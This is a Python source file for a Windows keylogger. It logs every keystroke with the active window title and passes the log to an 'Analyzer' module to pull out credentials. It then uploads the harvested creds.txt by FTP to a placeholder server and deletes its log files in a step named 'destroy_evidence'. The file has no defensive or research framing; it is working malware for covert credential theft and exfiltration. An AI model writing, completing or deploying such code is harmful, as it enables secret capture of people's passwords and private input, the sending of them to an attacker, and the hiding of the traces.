from multiprocessing import Queue # needed for compilation
from pynput.keyboard import Key, Listener
from win32gui import GetWindowText, GetForegroundWindow
import os
from sys import argv
from shutil import rmtree
import logging
import ftplib
import Analyzer
import win32file
import win32api

log_file = 'LOG_FILE_PATH'
cred_file = 'CRED_FILE_PATH'

class Logger:
    def __init__(self, log_file, cred_file):
        f = open(log_file, 'w'); f.close() # file creation
        self.log_file = log_file
        
        f = open(cred_file, 'w'); f.close() # file creation
        self.cred_file = cred_file
        logging.basicConfig(filename=(log_file), level=logging.DEBUG,
                            format=( '%(message)s : '))
        self.analyzer = Analyzer.Analyzer(log_file, self.cred_file)
    
    def on_press(self, Key):
        log_str = str(Key) + ' | ' + GetWindowText(GetForegroundWindow())
        if(str(Key) == 'Key.enter'):
            done_analyzing = False
            logging.info(log_str)
            if(not self.analyzer.will_not_parse):
                done_analyzing = self.analyzer.parse_log_file()
            if done_analyzing:
                return False
        else:
            logging.info(log_str)
    
    def log_keys(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()
    
    def send_file(self):
        # send file of credentials thru ftp
        session = ftplib.FTP('IP_ADDR', 'FTP_USERNAME', 'FTP_PASSWORD')
        file_to_send = open(self.cred_file, 'rb')
        session.storbinary('STOR ' + 'creds.txt', file_to_send)
        file_to_send.close()
        session.quit()
    
    def destroy_evidence(self):
        logging.shutdown()
        os.remove(log_file)
        os.remove(cred_file)
        self.recursively_destroy(os.getcwd() + r'\build')
    
    '''
    def recursively_destroy(self, path):
        if(os.path.isdir(path)):
            items_to_destroy = os.listdir(path)
            
            for item in items_to_destroy:
                new_path = path + '\\' + item
                if(os.path.isdir(new_path)):
                    self.recursively_destroy(new_path)
                else:
                    try:
                        win32file.MoveFileEx((new_path), 'C\\$Recycle.bin',
                            win32file.MOVEFILE_DELAY_UNTIL_REBOOT)
                    except:
                        continue
        else:
            var = win32file.MoveFileEx(path,  'C\\$Recycle.bin' ,
                    win32file.MOVEFILE_DELAY_UNTIL_REBOOT)
    '''

if __name__ == '__main__':
    logger = Logger(log_file, cred_file)
    logger.log_keys()
    logger.send_file()
    logger.destroy_evidence()
